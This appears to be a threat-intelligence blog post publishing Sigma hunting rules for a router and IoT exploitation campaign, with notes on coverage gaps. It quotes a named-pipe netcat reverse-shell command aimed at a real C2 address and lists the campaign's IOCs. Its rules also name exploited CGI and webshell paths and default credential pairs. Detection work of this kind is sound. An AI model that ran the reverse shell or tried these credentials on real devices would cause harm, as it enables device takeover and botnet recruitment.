---
title: "Detection Rules — AdvancedRouterScanner Campaign"
date: '2025-10-25'
layout: post
permalink: /hunting-detections/AdvancedRouterScanner-detections/
hide: true
redirect_from: /hunting-detections/AdvancedRouterScanner
thumbnail: /assets/images/cards/AdvancedRouterScanner.png
---

**Campaign:** AdvancedRouterScanner-Global-Router-Exploitation
**Date:** 2025-10-25
**Author:** The Hunters Ledger
**License:** CC BY 4.0
**Reference:** https://the-hunters-ledger.com/reports/AdvancedRouterScanner/

---

## Detection Coverage Summary

AdvancedRouterScanner is a purpose-built exploitation framework targeting embedded router and IoT web-management interfaces, chaining CGI-endpoint exploitation, default-credential authentication, reverse-shell deployment, and multi-architecture botnet payload staging across a five-stage attack chain observed against a large population of embedded devices globally. Coverage here is intentionally scoped to the two behavioral leads that retain analyst value despite mixed false-positive profiles; the campaign's atomic network and file-path indicators (reverse-shell C2 destination, payload-drop filename, payload-download host) are carried in the IOC feed rather than as standalone signatures.

| Rule Type | Detection | Hunting | MITRE Techniques Covered | Atomics → feed |
|---|---|---|---|---|
| YARA | 0 | 0 | — | 0 |
| Sigma | 0 | 2 | T1190, T1110.001 | 2 |
| Suricata | 0 | 0 | — | 1 |

> **Detection vs Hunting:** *Detection rules* are high-fidelity and evasion-resilient — safe to alert on. *Hunting rules* are broader, for scoping and threat-hunting — expect to review the hits.

**Atomics routed to the IOC feed:** the reverse-shell C2 destination `107.189.4.201:3778`, the payload-drop filename `/tmp/bn`, and the payload-download host `bot.gribostress.pro` (resolving to `107.189.4.201`) are transient indicators already carried in [`AdvancedRouterScanner-iocs.json`](/ioc-feeds/AdvancedRouterScanner-iocs.json) — each of the three original rules keyed solely on one of these hardcoded values, and removing the literal leaves no behavior to detect. Block them via the feed.

---

## Sigma Rules

### Hunting Rules

#### Suspicious Router CGI Access

**Tier:** Hunting
**Robustness:** 2
**ATT&CK Coverage:** T1190 (Exploit Public-Facing Application)
**Confidence:** MODERATE
**Rationale:** The selector list mixes genuinely malicious-only paths (`/web_shell_cmd.gch`, `/system.cmd`, `/shell?command=` — command-injection/webshell markers with no legitimate use) with core router administrative-UI endpoints (`/apply.cgi`, `/boaform/admin/formLogin`, `/cgi-bin/config.cgi`, `/login.cgi`, `/setup.cgi`) that see routine legitimate admin traffic. Because the selection is OR-matched, a hit on any administrative-surface path fires the rule exactly like a hit on a high-fidelity exploit path, so `level: high` on the combined selector overstated confidence — demoted to `medium` and scoped to Hunting. The endpoint set itself is durable (inherent to the vulnerable device's web application layout, not something the operator can rename), which keeps it a useful triage lead regardless of infrastructure rotation.
**False Positives:**
- Legitimate administrative logins and configuration changes via `/login.cgi`, `/setup.cgi`, `/apply.cgi`, and `/boaform/admin/formLogin` on the router's own management interface.
- Vulnerability scanners and asset-inventory tools that probe the same CGI paths for version fingerprinting.
**Deployment:** Web/proxy log monitoring at the network perimeter or router-fleet management plane; analyst review of hits, prioritizing `/web_shell_cmd.gch`, `/system.cmd`, and `/shell?command=` matches.

```yaml
title: Suspicious Router CGI Access
id: e5afdda0-43fc-42b1-b429-05cb0e0bd34e
status: experimental
description: >-
    Detects HTTP requests to CGI endpoints and paths commonly exploited by
    router/IoT scanning and exploitation tools to achieve command execution
    or credential harvesting on embedded web management interfaces.
references:
    - https://the-hunters-ledger.com/hunting-detections/AdvancedRouterScanner-detections/
author: The Hunters Ledger
date: '2025-10-25'
tags:
    - attack.initial-access
    - attack.t1190
    - detection.emerging-threats
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains:
            - "/web_shell_cmd.gch"
            - "/apply.cgi"
            - "/boaform/admin/formLogin"
            - "/cgi-bin/config.cgi"
            - "/login.cgi"
            - "/setup.cgi"
            - "/system.cmd"
            - "/shell?command="
    condition: selection
falsepositives:
    - Legitimate administrative access to router/IoT management interfaces
level: medium
```

#### Default Credential Brute Force

**Tier:** Hunting
**Robustness:** 2
**ATT&CK Coverage:** T1110.001 (Password Guessing)
**Confidence:** MODERATE
**Rationale:** The rule requires both a default-style username AND a default-style password from small curated lists, a genuinely tight AND-based match — but it evaluates a single authentication event with no count or threshold aggregation, so it detects "an auth attempt used default-like credentials," not literally repeated brute-force attempts as the title implies. Default credentials remain in active legitimate use on unhardened router/IoT fleets — the exact device category this campaign targets — so this is a real, recurring benign-hit scenario rather than a one-time setup artifact. `level` demoted from `high` to `medium` and scoped to Hunting accordingly; the durable, technique-level signal (an attacker enumerating known default credentials against the auth surface) still makes it a valuable triage lead.
**False Positives:**
- Legitimate administrators authenticating to routers/IoT devices that were never hardened off default credentials.
- Automated asset-inventory or compliance-scanning tools that intentionally test for default-credential exposure.
**Deployment:** Authentication log monitoring at the router/IoT fleet management plane; pair hits with a device-hardening audit rather than blind alerting.

```yaml
title: Default Credential Brute Force
id: b88fd219-6352-4cdb-9406-be4acdc7dfe8
status: experimental
description: >-
    Detects authentication attempts using common default or weak
    username/password pairs against router and IoT management interfaces,
    consistent with automated credential brute-forcing tools.
references:
    - https://the-hunters-ledger.com/hunting-detections/AdvancedRouterScanner-detections/
author: The Hunters Ledger
date: '2025-10-25'
tags:
    - attack.credential-access
    - attack.t1110.001
    - detection.emerging-threats
logsource:
    category: authentication
detection:
    selection:
        user|contains:
            - "admin"
            - "root"
            - "guest"
            - "operator"
        password|contains:
            - "admin"
            - "password"
            - "1234"
            - "changeme"
    condition: selection
falsepositives:
    - Legitimate administrators using default credentials before hardening a new device
level: medium
```

---

## Coverage Gaps

**Atomics routed to the IOC feed (3 of 5 original rules).** Three of the file's five original rules keyed solely on one hardcoded literal each, with no behavioral signal surviving the literal's removal — per the tiering rubric's routing test, these are IOC-feed entries, not rules:

- **Reverse Shell Establishment** — originally a freeform, non-conforming Suricata-style block (`alert tcp any any -> 107.189.4.201 3778 (msg:"Reverse Shell to C2"; sid:200001; rev:1;)`) with no content anchor and no `flow`/`classtype`/`metadata`, matching only the destination IP and port — a pure atomic. `107.189.4.201:3778` is already carried in [`AdvancedRouterScanner-iocs.json`](/ioc-feeds/AdvancedRouterScanner-iocs.json) (`IOCs.Infrastructure`).
- **Suspicious Dropped Files in Temp Directory** matched only the `/tmp/bn` staging filename. Already carried in the feed (`IOCs.Payloads`).
- **Payload Download from Known Hosts** matched only the exact hostname `bot.gribostress.pro` and IP `107.189.4.201`. Both already carried in the feed (`IOCs.Infrastructure`).

No feed edits were required for these three — all were already present from the original analysis.

**Reverse-shell technique visible in the IOC feed but not expressible as a network signature.** The feed's `IOCs.Commands` array preserves the literal shell command used to establish the reverse shell: `mknod bOY p; /bin/sh < bOY | nc 107.189.4.201 3778 > bOY` — a named-pipe (mknod/mkfifo) reverse shell targeting BusyBox/embedded Linux, consistent with T1059.004 (Unix Shell). This is a host-side process/command-execution artifact, not something distinguishable in network payload content — the raw netcat stream carries no protocol markers once the connection is established, so it cannot be expressed as a Suricata signature. **What would enable a rule:** host-level command-execution or auditd telemetry (EDR process-creation logging, or router-side syslog capturing shell invocation) would support a dedicated Sigma rule keyed on the `mknod` + `/bin/sh` + `nc` command combination.

**Feed lists four exploited CGI endpoints the current rule does not cover.** `IOCs.ExploitEndpoints` includes `/goform/formLogin`, `/admin/login.cgi`, `/index.cgi`, and `/test_endpoint` in addition to the eight paths already in the Suspicious Router CGI Access selection. `/goform/formLogin` and `/admin/login.cgi` are reasonable additions in the same vein as the existing legitimate-admin-surface paths already in the rule; `/index.cgi` and `/test_endpoint` are broad/generic enough (a common default landing-page name, and a name suggestive of internal tooling rather than a distinct exploited endpoint) that they would need dedicated false-positive evaluation before inclusion — they are not added here.

**Multi-architecture botnet loader naming pattern not captured.** `IOCs.Payloads` lists five CPU-architecture-suffixed downloader filenames (`boatnet.mips`, `boatnet.mpsl`, `boatnet.arm`, `boatnet.ppc`, `boatnet.x86`) plus `main_mpsl`, consistent with the classic Mirai-derivative technique of staging multiple architecture variants and executing whichever one the target CPU supports. No download-path or full-write-path telemetry was captured for these beyond the bare filenames, so a precise file-event or download-URI rule cannot be written with confidence. **What would enable a rule:** the full drop path and download-request telemetry (proxy/web log capturing the request URI, or file-event telemetry capturing the full write path) for the `boatnet.*` family.

---

## License
Detection rules are licensed under **Creative Commons Attribution 4.0 International (CC BY 4.0)**.  
Free to use, including commercially, with attribution to The Hunters Ledger.
